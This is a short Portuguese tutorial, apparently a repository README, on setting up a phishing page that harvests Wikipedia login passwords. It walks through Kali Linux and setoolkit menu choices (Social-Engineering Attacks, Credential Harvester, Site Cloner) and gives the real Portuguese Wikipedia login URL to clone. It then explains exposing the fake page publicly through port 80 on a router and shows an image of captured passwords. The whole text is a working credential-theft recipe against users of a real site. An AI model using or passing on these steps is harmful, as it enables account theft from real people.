# Phishing para captura de senhas da Wikipédia

## Ferramentas

- Kali Linux
- setoolkit

## Configurando o Phishing no Kali Linux
- Obtendo o endereço da máquina: ``` ifconfig ```
- Obtendo o endereço público: ``` curl ifconfig.co ```
- Acesso root: ``` sudo su ```
- Iniciando o setoolkit: ``` setoolkit ```
- Tipo de ataque: ``` Social-Engineering Attacks ```
- Vetor de ataque: ``` Web Site Attack Vectors ```
- Método de ataque: ```Credential Harvester Attack Method ```
- Método de ataque: ``` Site Cloner ```
- URL para clone: https://pt.wikipedia.org/w/index.php?title=Especial:Entrar&returnto=Login&returntoquery=centralAuthAutologinTried%3D1%26centralAuthError%3DNot%2Bcentrally%2Blogged%2Bin

### Observações com o endereço público

- Abra a porta 80 no seu roteador.
- Abra em outra rede (rede móveis por exemplo) com o endereço público:80. Exemplo: 111.111.111:80

### Resutados

![Resultado](./passwd.png "IMG")
